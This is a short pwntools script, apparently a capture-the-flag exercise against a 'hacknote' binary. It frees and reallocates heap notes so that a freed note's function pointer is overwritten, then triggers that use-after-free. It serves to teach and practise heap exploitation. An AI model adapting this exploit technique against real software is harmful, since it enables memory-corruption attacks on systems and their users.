from pwn import *

NOTE_AMOUNT = 2
BUF = 'AAAA'


class Prompts:
    CHOICE = 'Your choice :'
    NOTE_SIZE = 'Note size :'
    CONTENT = 'Content :'
    INDEX = 'Index :'


class BinSizes:
    NOTE = '8'
    CONTENT = '40'


class Choices:
    ADD = '1'
    DELETE = '2'
    PRINT = '3'


p = gdb.debug(
    './hacknote',
    '''
    c
    '''
)


def add_different_bin_notes():
    print("[*] Adding (allocating) notes whose content size is different than the note's size.")
    for _ in range(NOTE_AMOUNT):
        p.sendafter(Prompts.CHOICE, Choices.ADD)
        p.sendafter(Prompts.NOTE_SIZE, BinSizes.CONTENT)
        p.sendafter(Prompts.CONTENT, BUF)


def fill_bin_with_note_chunks():
    print("[*] Deleting (freeing) the notes so that the note and content chunks end up on different fastbins.")
    for note_index in range(NOTE_AMOUNT):
        p.sendafter(Prompts.CHOICE, Choices.DELETE)
        p.sendafter(Prompts.INDEX, str(note_index))


def add_same_bin_note():
    print("[*] Add (allocate) a note whose content size is equivalent to that of a note.")
    p.sendafter(Prompts.CHOICE, Choices.ADD)
    p.sendafter(Prompts.NOTE_SIZE, BinSizes.NOTE)
    p.sendafter(Prompts.CONTENT, BUF)


def call_note_func():
    print("[*] Calling the overrided function.")
    p.sendafter(Prompts.CHOICE, Choices.PRINT)
    p.sendafter(Prompts.INDEX, '0')


if __name__ == "__main__":
    add_different_bin_notes()
    fill_bin_with_note_chunks()
    add_same_bin_note()
    call_note_func()
